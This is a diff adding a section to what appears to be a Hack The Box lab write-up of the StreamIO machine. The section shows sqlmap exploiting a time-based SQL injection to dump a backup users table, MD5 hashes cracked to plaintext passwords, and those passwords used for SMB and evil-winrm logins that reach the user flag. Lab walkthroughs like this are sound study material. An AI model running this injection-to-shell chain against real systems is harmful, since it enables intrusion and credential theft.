@@ -410,6 +410,55 @@ Parameter: movie_id <span class="o">(</span>POST<span class="o">)</span>
     Payload: <span class="nv">movie_id</span><span class="o">=</span><span class="m">1666</span> WAITFOR DELAY <span class="s1">&#39;0:0:5&#39;</span>
 ---
 </code></pre></div>
+
+<p>This time the <strong>db_admin</strong> user is used to conduct those queries instead if the <strong>db_user</strong> before. Maybe we can access <strong>streamio_backup</strong> now.
+And yesssss, the tables enumeration worked.. more or less.. sqlmap had a hard time to retrieve those tables. Maybe the machine was under load at that time.</p>
+<div class="highlight"><pre><span></span><code>python sqlmap.py -u <span class="s2">&quot;https://streamIO.htb/admin/?movie&quot;</span> --method<span class="o">=</span>POST --data <span class="s2">&quot;movie_id=1666&quot;</span> --cookie<span class="o">=</span><span class="s2">&quot;PHPSESSID=jedeq7831tbnm0b12lneefghmd&quot;</span>  --dbms<span class="o">=</span><span class="s2">&quot;Microsoft SQL Server&quot;</span> --output-dir<span class="o">=</span>~/venv3/htb/streamio/sqlmap/ -D streamio_backup --tables --fresh-queries
+Database: streamio_backup
+<span class="o">[</span><span class="m">2</span> tables<span class="o">]</span>
++--------+
+<span class="p">|</span> movies <span class="p">|</span>
+<span class="p">|</span> users  <span class="p">|</span>
++--------+
+</code></pre></div>
+
+<p>The table <strong>users</strong> has 3 columns <code>id, password, username</code>. The retrieving was very slow, retrieving 2 rows took 45 minutes.</p>
+<div class="highlight"><pre><span></span><code>nikk37 - 389d14cb8e4e9b94b137deb1caf0612a
+yoshihide - b779ba15cedfd22a023c4d8bcf5f2332
+</code></pre></div>
+
+<p>Again MD5 hashes...</p>
+<div class="highlight"><pre><span></span><code>389d14cb8e4e9b94b137deb1caf0612a    md5 get_dem_girls2@yahoo.com
+b779ba15cedfd22a023c4d8bcf5f2332    md5 66boysandgirls..
+</code></pre></div>
+
+<p>Great both cracked, let's see if SMB login works.</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># nikk37 worked</span>
+cme smb streamio.htb -u nikk37 -p <span class="s1">&#39;get_dem_girls2@yahoo.com&#39;</span>
+SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span>.0 Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:streamIO.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>+<span class="o">]</span> streamIO.htb<span class="se">\n</span>ikk37:get_dem_girls2@yahoo.com
+
+<span class="c1"># and whats even better? winrm worked too</span>
+
+evil-winrm  -i <span class="nv">$TIP</span> -u nikk37 -p <span class="s1">&#39;get_dem_girls2@yahoo.com&#39;</span>
+
+Evil-WinRM shell v3.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\n</span>ikk37<span class="se">\D</span>ocuments&gt;
+
+<span class="c1"># and there is the user flag</span>
+*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\n</span>ikk37<span class="se">\D</span>esktop&gt; ls
+
+
+    Directory: C:<span class="se">\U</span>sers<span class="se">\n</span>ikk37<span class="se">\D</span>esktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        <span class="m">6</span>/17/2022   <span class="m">5</span>:17 AM             <span class="m">34</span> user.txt
+</code></pre></div>
   </div>
   <div class="tag-cloud">
     <p>
